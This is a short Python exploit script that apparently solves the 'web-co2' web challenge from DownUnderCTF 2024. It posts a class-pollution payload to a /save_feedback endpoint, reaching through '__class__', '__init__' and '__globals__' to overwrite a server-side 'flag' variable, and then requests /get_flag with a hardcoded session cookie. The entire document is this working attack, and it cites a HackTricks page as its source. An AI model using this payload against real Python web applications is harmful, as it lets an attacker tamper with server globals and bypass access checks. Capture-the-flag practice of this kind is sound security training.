import requests


DOMAIN = "https://web-co2-99ded1262ff8ec34.2024.ductf.dev"
cookies = {
    "session": ".eJwtzj0OwjAMQOG7ZGaIY8dJe5nKv4K1pRPi7mRAeuM3vE858ozrWfb3ecejHC8ve4GRGJPnatMqc7gA9mhmLsq9atTcPFJIQtOB26KCTSeZhFnmYKfOQDE8xJfO7oCGKtrIiRlFKkUVto5tm6TJgGyDzB3KGrmvOP835fsDYSMxFA.Zoh-rg.iNrt_JDtc4T2eKZYWIhvW6NpcAw"
}

# https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution
payload = {
    '__class__': {
        '__init__': {
            '__globals__': {'flag': 'true'}
        }
    }
}

resp = requests.post(f"{DOMAIN}/save_feedback", json=payload, cookies=cookies)
assert resp.json()["success"] == "true", resp.json()

print(requests.get(f"{DOMAIN}/get_flag", cookies=cookies).content)
